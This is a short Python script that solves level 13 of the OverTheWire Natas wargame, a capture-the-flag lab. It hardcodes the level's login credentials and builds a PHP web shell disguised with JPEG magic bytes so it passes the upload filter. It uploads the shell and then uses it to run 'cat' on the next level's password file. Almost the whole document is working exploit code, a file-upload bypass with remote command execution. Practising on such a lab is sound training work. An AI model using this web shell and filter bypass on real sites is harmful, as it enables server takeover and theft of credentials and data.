import re
import requests
import binascii

level = 13
creds = ('natas13','jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY')
url   = 'http://natas%s.natas.labs.overthewire.org/' % level

session = requests.Session()
response = session.get(url,auth=creds)
data = response.text

#print(data)

w=open('exploit.php','wb')
w.write(binascii.unhexlify('ffd8ffe0'))
w.close()
w=open('exploit.php','a+')
w.write('<?php system($_GET["cmd"]) ?>')
w.close()

file = {'uploadedfile': open('exploit.php','rb')}
formdata = {'MAX_FILE_SIZE':'1000','filename':'exploit.php', 'submit':'submit'}

response = session.post(url,auth=creds,data=formdata,files=file)

data = response.text

#print(data)
shell_url = re.findall('<a href="upload/(.*)">upload/',data)[0]
shell_url = url+'upload/'+shell_url+'?cmd=cat /etc/natas_webpass/natas14'

response = session.get(shell_url,auth=creds)
data = response.text

print(data)
